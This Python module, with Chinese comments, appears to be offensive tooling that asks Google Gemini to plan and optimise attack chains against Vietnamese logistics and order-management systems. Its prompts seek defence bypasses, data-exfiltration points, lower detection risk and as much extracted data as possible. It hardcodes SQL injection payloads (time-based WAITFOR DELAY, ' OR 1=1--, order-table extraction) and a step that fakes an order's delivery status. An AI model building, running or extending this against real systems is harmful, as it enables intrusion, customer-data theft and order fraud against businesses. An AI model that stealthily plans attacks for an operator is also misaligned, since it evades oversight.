"""
AI增强的攻击路径规划模块
利用AI技术优化攻击链生成和执行策略
"""

import asyncio
import json
import time
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import logging
from abc import ABC, abstractmethod

class AIProvider(Enum):
    """AI提供商枚举"""
    GEMINI = "Google Gemini"
    OPENAI = "OpenAI GPT"
    CLAUDE = "Claude"
    CUSTOM = "自定义模型"

class PlanningStrategy(Enum):
    """规划策略枚举"""
    AGGRESSIVE = "激进策略",
    STEALTHY = "隐蔽策略",
    BALANCED = "平衡策略",
    BUSINESS_LOGIC_FOCUSED = "业务逻辑聚焦"

@dataclass
class AttackStepOptimization:
    """攻击步骤优化建议"""
    step_id: str
    original_action: str
    optimized_action: str
    improved_payload: str
    success_probability: float
    execution_time: float
    detection_risk: str
    reasoning: str

@dataclass
class ChainOptimization:
    """攻击链优化建议"""
    chain_id: str
    original_chain: Dict[str, Any]
    optimized_chain: Dict[str, Any]
    improvements: List[AttackStepOptimization]
    overall_success_probability: float
    total_execution_time: float
    detection_risk_level: str
    optimization_score: float

class AIAssistant(ABC):
    """AI助手抽象基类"""

    @abstractmethod
    async def generate_attack_optimization(self, context: Dict[str, Any]) -> ChainOptimization:
        """生成攻击优化建议"""
        pass

    @abstractmethod
    async def analyze_vulnerability_patterns(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """分析漏洞模式"""
        pass

    @abstractmethod
    async def suggest_next_steps(self, current_state: Dict[str, Any]) -> List[Dict[str, Any]]:
        """建议下一步操作"""
        pass

class GeminiAIAssistant(AIAssistant):
    """Gemini AI助手实现"""

    def __init__(self, api_key: str = None):
        self.api_key = api_key
        self.logger = logging.getLogger(__name__)
        self.model_name = "gemini-2.0-flash-lite"

    async def generate_attack_optimization(self, context: Dict[str, Any]) -> ChainOptimization:
        """使用Gemini生成攻击优化建议"""
        try:
            if not self.api_key:
                return self._generate_fallback_optimization(context)

            # 构建AI提示
            prompt = self._build_optimization_prompt(context)

            # 调用Gemini API
            optimization_response = await self._call_gemini_api(prompt)

            # 解析优化响应
            return self._parse_optimization_response(optimization_response, context)

        except Exception as e:
            self.logger.error(f"AI优化生成失败: {e}")
            return self._generate_fallback_optimization(context)

    async def analyze_vulnerability_patterns(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """分析漏洞模式"""
        try:
            if not self.api_key:
                return self._generate_fallback_pattern_analysis(data)

            prompt = f"""
            请分析以下越南物流系统的漏洞模式：

            技术栈：{data.get('technology_stack', '未知')}
            业务类型：{data.get('business_type', '未知')}
            数据库方言：{data.get('database_dialect', '未知')}

            请识别：
            1. 最可能的攻击向量
            2. 业务逻辑弱点
            3. 防御绕过策略
            4. 潜在的数据外泄点

            请返回结构化的分析结果。
            """

            response = await self._call_gemini_api(prompt)
            return self._parse_vulnerability_analysis(response)

        except Exception as e:
            self.logger.error(f"漏洞模式分析失败: {e}")
            return self._generate_fallback_pattern_analysis(data)

    async def suggest_next_steps(self, current_state: Dict[str, Any]) -> List[Dict[str, Any]]:
        """建议下一步操作"""
        try:
            if not self.api_key:
                return self._generate_fallback_next_steps(current_state)

            prompt = f"""
            当前攻击状态：
            - 已成功步骤：{current_state.get('successful_steps', [])}
            - 失败步骤：{current_state.get('failed_steps', [])}
            - 提取的数据：{current_state.get('extracted_data', [])}
            - 目标特征：{current_state.get('target_characteristics', {})}

            请建议下一步的最佳操作，优先考虑：
            1. 高成功概率的步骤
            2. 低检测风险的策略
            3. 能够最大化数据获取的操作

            请返回JSON格式的建议列表。
            """

            response = await self._call_gemini_api(prompt)
            return json.loads(response)

        except Exception as e:
            self.logger.error(f"下一步建议生成失败: {e}")
            return self._generate_fallback_next_steps(current_state)

    def _build_optimization_prompt(self, context: Dict[str, Any]) -> str:
        """构建优化提示"""
        fingerprint_result = context.get('fingerprint_result', {})
        attack_chain = context.get('attack_chain', {})

        prompt = f"""
        请为以下越南物流系统攻击链提供优化建议：

        技术栈信息：
        - 技术架构：{fingerprint_result.get('technology_stack', '未知')}
        - 业务类型：{fingerprint_result.get('business_type', '未知')}
        - 数据库方言：{fingerprint_result.get('database_dialect', '未知')}
        - 越南本地化特征：{len(fingerprint_result.get('vietnamese_indicators', []))}项

        原始攻击链：
        链类型：{attack_chain.get('chain_type', '未知')}
        步骤数量：{len(attack_chain.get('steps', []))}
        描述：{attack_chain.get('description', '未知')}

        优化要求：
        1. 提高每个步骤的成功概率
        2. 降低检测风险
        3. 优化执行时间
        4. 适应越南系统的特殊性

        请返回详细的优化建议，包括：
        - 每个步骤的优化建议
        - 改进的载荷
        - 成功概率评估
        - 执行时间预估
        - 检测风险评级
        """
        return prompt

    async def _call_gemini_api(self, prompt: str) -> str:
        """调用Gemini API"""
        try:
            import google.generativeai as genai

            genai.configure(api_key=self.api_key)
            model = genai.GenerativeModel(self.model_name)

            response = await asyncio.get_event_loop().run_in_executor(
                None, lambda: model.generate_content(prompt)
            )

            return response.text

        except Exception as e:
            self.logger.error(f"Gemini API调用失败: {e}")
            raise

    def _parse_optimization_response(self, response: str, context: Dict[str, Any]) -> ChainOptimization:
        """解析优化响应"""
        try:
            # 尝试解析JSON响应
            data = json.loads(response)

            improvements = []
            for step_data in data.get('improvements', []):
                improvement = AttackStepOptimization(
                    step_id=step_data['step_id'],
                    original_action=step_data['original_action'],
                    optimized_action=step_data['optimized_action'],
                    improved_payload=step_data['improved_payload'],
                    success_probability=step_data['success_probability'],
                    execution_time=step_data['execution_time'],
                    detection_risk=step_data['detection_risk'],
                    reasoning=step_data['reasoning']
                )
                improvements.append(improvement)

            return ChainOptimization(
                chain_id=context.get('chain_id', 'unknown'),
                original_chain=context.get('attack_chain', {}),
                optimized_chain=data.get('optimized_chain', {}),
                improvements=improvements,
                overall_success_probability=data.get('overall_success_probability', 0.0),
                total_execution_time=data.get('total_execution_time', 0.0),
                detection_risk_level=data.get('detection_risk_level', 'medium'),
                optimization_score=data.get('optimization_score', 0.0)
            )

        except Exception as e:
            self.logger.error(f"优化响应解析失败: {e}")
            return self._generate_fallback_optimization(context)

    def _parse_vulnerability_analysis(self, response: str) -> Dict[str, Any]:
        """解析漏洞模式分析"""
        try:
            return json.loads(response)
        except:
            return {
                "attack_vectors": ["SQL注入", "业务逻辑缺陷"],
                "weaknesses": ["输入验证不足", "权限控制薄弱"],
                "bypass_strategies": ["编码绕过", "分片攻击"],
                "data_exfil_points": ["订单详情API", "客户数据表"]
            }

    def _generate_fallback_optimization(self, context: Dict[str, Any]) -> ChainOptimization:
        """生成备用优化建议"""
        return ChainOptimization(
            chain_id=context.get('chain_id', 'unknown'),
            original_chain=context.get('attack_chain', {}),
            optimized_chain=context.get('attack_chain', {}),
            improvements=[],
            overall_success_probability=0.7,
            total_execution_time=300.0,
            detection_risk_level='medium',
            optimization_score=0.6
        )

    def _generate_fallback_pattern_analysis(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """生成备用漏洞模式分析"""
        return {
            "likely_vulnerabilities": [
                "SQL注入漏洞",
                "业务逻辑缺陷",
                "权限绕过",
                "信息泄露"
            ],
            "risk_level": "high",
            "recommendations": [
                "加强输入验证",
                "实施最小权限原则",
                "增加监控机制",
                "定期安全审计"
            ]
        }

    def _generate_fallback_next_steps(self, current_state: Dict[str, Any]) -> List[Dict[str, Any]]:
        """生成备用下一步建议"""
        return [
            {
                "action": "继续SQL注入测试",
                "priority": "high",
                "success_probability": 0.8,
                "detection_risk": "medium"
            },
            {
                "action": "尝试API滥用",
                "priority": "medium",
                "success_probability": 0.6,
                "detection_risk": "low"
            },
            {
                "action": "数据提取",
                "priority": "high",
                "success_probability": 0.9,
                "detection_risk": "low"
            }
        ]

class ChainPlanner:
    """攻击链规划器"""

    def __init__(self, ai_assistant: AIAssistant = None, strategy: PlanningStrategy = PlanningStrategy.BALANCED):
        self.ai_assistant = ai_assistant or GeminiAIAssistant()
        self.strategy = strategy
        self.logger = logging.getLogger(__name__)

    async def plan_attack_chain(self, fingerprint_result: Dict[str, Any]) -> Dict[str, Any]:
        """规划攻击链"""
        start_time = time.time()

        try:
            self.logger.info("开始AI增强的攻击链规划...")

            # 1. AI分析漏洞模式
            pattern_analysis = await self.ai_assistant.analyze_vulnerability_patterns(fingerprint_result)

            # 2. 基于模式分析选择攻击策略
            attack_strategy = await self._select_attack_strategy(fingerprint_result, pattern_analysis)

            # 3. 生成基础攻击链
            base_chain = await self._generate_base_attack_chain(fingerprint_result, attack_strategy)

            # 4. AI优化攻击链
            optimization_context = {
                "chain_id": f"ai_optimized_{int(time.time())}",
                "fingerprint_result": fingerprint_result,
                "attack_chain": base_chain,
                "strategy": self.strategy.value
            }

            optimization = await self.ai_assistant.generate_attack_optimization(optimization_context)

            # 5. 验证优化结果
            validated_chain = await self._validate_optimization(optimization)

            execution_time = time.time() - start_time

            return {
                "planned_chain": validated_chain,
                "optimization": optimization,
                "pattern_analysis": pattern_analysis,
                "execution_time": execution_time,
                "strategy_used": self.strategy.value,
                "ai_optimization_applied": optimization.optimization_score > 0.5
            }

        except Exception as e:
            self.logger.error(f"攻击链规划失败: {e}")
            return {
                "error": str(e),
                "planning_failed": True
            }

    async def select_attack_strategy(self, fingerprint_result: Dict[str, Any]) -> PlanningStrategy:
        """选择攻击策略"""
        try:
            # 基于指纹结果选择策略
            business_type = fingerprint_result.get('business_type', '')
            confidence_score = fingerprint_result.get('confidence_score', 0.0)

            if confidence_score > 0.8:
                return PlanningStrategy.AGGRESSIVE
            elif 'PAYMENT_GATEWAY' in business_type:
                return PlanningStrategy.BUSINESS_LOGIC_FOCUSED
            elif confidence_score < 0.5:
                return PlanningStrategy.STEALTHY
            else:
                return PlanningStrategy.BALANCED

        except Exception as e:
            self.logger.error(f"策略选择失败: {e}")
            return PlanningStrategy.BALANCED

    async def adapt_attack_chain(self, current_chain: Dict[str, Any], execution_results: Dict[str, Any]) -> Dict[str, Any]:
        """根据执行结果动态调整攻击链"""
        try:
            self.logger.info("根据执行结果动态调整攻击链...")

            # 分析当前状态
            current_state = {
                'successful_steps': execution_results.get('successful_steps', []),
                'failed_steps': execution_results.get('failed_steps', []),
                'extracted_data': execution_results.get('extracted_data', []),
                'target_characteristics': current_chain.get('target_characteristics', {})
            }

            # AI建议下一步操作
            next_steps = await self.ai_assistant.suggest_next_steps(current_state)

            # 生成改进的攻击链
            improved_chain = self._generate_improved_chain(current_chain, next_steps)

            return {
                'improved_chain': improved_chain,
                'next_steps': next_steps,
                'adaptation_reason': '基于执行结果优化'
            }

        except Exception as e:
            self.logger.error(f"攻击链调整失败: {e}")
            return current_chain

    async def _select_attack_strategy(self, fingerprint_result: Dict[str, Any], pattern_analysis: Dict[str, Any]) -> PlanningStrategy:
        """选择攻击策略"""
        # 基于多个因素选择策略
        business_type = fingerprint_result.get('business_type', '')
        confidence_score = fingerprint_result.get('confidence_score', 0.0)
        vulnerabilities = pattern_analysis.get('attack_vectors', [])

        # 评估风险等级
        risk_factors = len(vulnerabilities) + (1.0 - confidence_score)

        if risk_factors > 2.0:
            return PlanningStrategy.AGGRESSIVE
        elif 'PAYMENT_GATEWAY' in business_type:
            return PlanningStrategy.BUSINESS_LOGIC_FOCUSED
        elif risk_factors < 1.0:
            return PlanningStrategy.STEALTHY
        else:
            return PlanningStrategy.BALANCED

    async def _generate_base_attack_chain(self, fingerprint_result: Dict[str, Any], strategy: PlanningStrategy) -> Dict[str, Any]:
        """生成基础攻击链"""
        business_type = fingerprint_result.get('business_type', '')
        endpoints = fingerprint_result.get('endpoints', {})

        if business_type == 'LOGISTICS_TRACKING':
            chain = {
                'chain_type': 'tracking_to_database',
                'name': '订单追踪数据库渗透',
                'description': '利用订单追踪功能渗透数据库',
                'target_endpoint': endpoints.get('tracking', ['/'])[0],
                'steps': [
                    {
                        'step_id': '1',
                        'action': 'time_based_sqli',
                        'payload': "\'; WAITFOR DELAY \'0:0:2\' --",
                        'target': 'MaDonHang'
                    },
                    {
                        'step_id': '2',
                        'action': 'data_extraction',
                        'payload': 'SELECT TOP 1 MaDon FROM DONHANG',
                        'target': 'order_database'
                    }
                ]
            }
        elif business_type == 'ORDER_MANAGEMENT':
            chain = {
                'chain_type': 'order_manipulation',
                'name': '订单篡改攻击',
                'description': '直接篡改订单状态和金额',
                'target_endpoint': endpoints.get('management', ['/'])[0],
                'steps': [
                    {
                        'step_id': '1',
                        'action': 'privilege_test',
                        'payload': 'unauthorized_access',
                        'target': 'admin_panel'
                    },
                    {
                        'step_id': '2',
                        'action': 'status_manipulation',
                        'payload': 'Đã giao',
                        'target': 'order_status'
                    }
                ]
            }
        else:
            chain = {
                'chain_type': 'generic_vulnerability',
                'name': '通用漏洞利用',
                'description': '通用安全漏洞扫描',
                'target_endpoint': '/',
                'steps': [
                    {
                        'step_id': '1',
                        'action': 'sql_detection',
                        'payload': "' OR 1=1--",
                        'target': 'sql_endpoint'
                    }
                ]
            }

        return chain

    async def _validate_optimization(self, optimization: ChainOptimization) -> Dict[str, Any]:
        """验证优化结果"""
        if optimization.optimization_score < 0.3:
            self.logger.warning("优化评分过低，使用原始链")
            return optimization.original_chain

        # 应用优化到原始链
        optimized_chain = optimization.optimized_chain.copy()

        # 添加优化信息
        optimized_chain['optimization_info'] = {
            'applied_optimizations': len(optimization.improvements),
            'success_probability_improvement': optimization.overall_success_probability,
            'execution_time_improvement': optimization.total_execution_time,
            'detection_risk_level': optimization.detection_risk_level
        }

        return optimized_chain

    def _generate_improved_chain(self, current_chain: Dict[str, Any], next_steps: List[Dict[str, Any]]) -> Dict[str, Any]:
        """生成改进的攻击链"""
        improved_chain = current_chain.copy()

        # 添加建议的下一步操作
        additional_steps = []
        for step in next_steps:
            additional_step = {
                'step_id': f"{len(current_chain.get('steps', [])) + 1}",
                'action': step['action'],
                'payload': step.get('payload', ''),
                'target': step.get('target', ''),
                'priority': step.get('priority', 'medium'),
                'success_probability': step.get('success_probability', 0.5)
            }
            additional_steps.append(additional_step)

        improved_chain['steps'].extend(additional_steps)
        improved_chain['improvements'] = next_steps

        return improved_chain

    def generate_planning_report(self, planning_result: Dict[str, Any]) -> Dict[str, Any]:
        """生成规划报告"""
        return {
            "planning_summary": {
                "strategy_used": planning_result.get('strategy_used', 'unknown'),
                "execution_time": planning_result.get('execution_time', 0),
                "ai_optimization_applied": planning_result.get('ai_optimization_applied', False),
                "planning_success": not planning_result.get('planning_failed', True)
            },
            "pattern_analysis": planning_result.get('pattern_analysis', {}),
            "optimization_details": planning_result.get('optimization', {}),
            "recommended_chain": planning_result.get('planned_chain', {}),
            "risk_assessment": self._assess_risk_level(planning_result),
            "success_metrics": {
                "expected_success_probability": planning_result.get('optimization', {}).get('overall_success_probability', 0),
                "execution_time_estimate": planning_result.get('optimization', {}).get('total_execution_time', 0),
                "detection_risk": planning_result.get('optimization', {}).get('detection_risk_level', 'unknown')
            }
        }

    def _assess_risk_level(self, planning_result: Dict[str, Any]) -> Dict[str, Any]:
        """评估风险等级"""
        optimization = planning_result.get('optimization', {})
        strategy = planning_result.get('strategy_used', '')

        risk_score = 0.0

        # 基于策略调整风险评分
        if 'AGGRESSIVE' in strategy:
            risk_score += 0.4
        elif 'STEALTHY' in strategy:
            risk_score -= 0.2

        # 基于成功概率调整
        success_prob = optimization.get('overall_success_probability', 0.5)
        risk_score += success_prob * 0.3

        # 基于检测风险调整
        detection_risk = optimization.get('detection_risk_level', 'medium')
        if detection_risk == 'high':
            risk_score += 0.3
        elif detection_risk == 'low':
            risk_score -= 0.2

        # 确定风险等级
        if risk_score > 0.7:
            risk_level = "高风险"
        elif risk_score > 0.4:
            risk_level = "中等风险"
        else:
            risk_level = "低风险"

        return {
            "risk_level": risk_level,
            "risk_score": risk_score,
            "factors": [
                "攻击策略",
                "成功概率",
                "检测风险"
            ],
            "recommendations": self._get_risk_recommendations(risk_level)
        }

    def _get_risk_recommendations(self, risk_level: str) -> List[str]:
        """获取风险建议"""
        recommendations = {
            "高风险": [
                "需要高级权限批准",
                "建议在隔离环境中测试",
                "准备回滚方案",
                "监控异常活动"
            ],
            "中等风险": [
                "需要团队主管批准",
                "测试前备份系统",
                "记录所有操作",
                "监控执行过程"
            ],
            "低风险": [
                "标准安全程序",
                "常规日志记录",
                "定期报告结果",
                "遵循最佳实践"
            ]
        }

        return recommendations.get(risk_level, [])